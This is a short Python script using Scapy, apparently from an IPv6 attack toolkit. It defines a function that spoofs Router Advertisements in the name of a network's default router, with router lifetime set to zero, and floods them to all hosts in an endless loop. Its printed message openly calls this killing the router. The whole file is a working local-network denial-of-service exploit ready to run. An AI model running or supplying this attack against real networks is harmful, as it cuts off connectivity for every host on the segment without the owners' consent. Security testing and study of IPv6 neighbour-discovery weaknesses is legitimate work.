#! usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, getmacbyip6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp


def killRouter_RA(interface, smac, sip):
    if smac == "":
        smac = getmacbyip6(sip)
    # Generate packet
    print("Killing the default router with address " + sip + " , press Ctrl C to stop the attack")
    layer3 = IPv6(src=sip, dst="ff02::1")
    packet = Ether(src=smac) / layer3 / ICMPv6ND_RA(prf="High", routerlifetime=0)
    if interface == "":
        sendp(packet, loop=1, verbose=False)
    else:
        sendp(packet, loop=1, verbose=False, iface=interface)

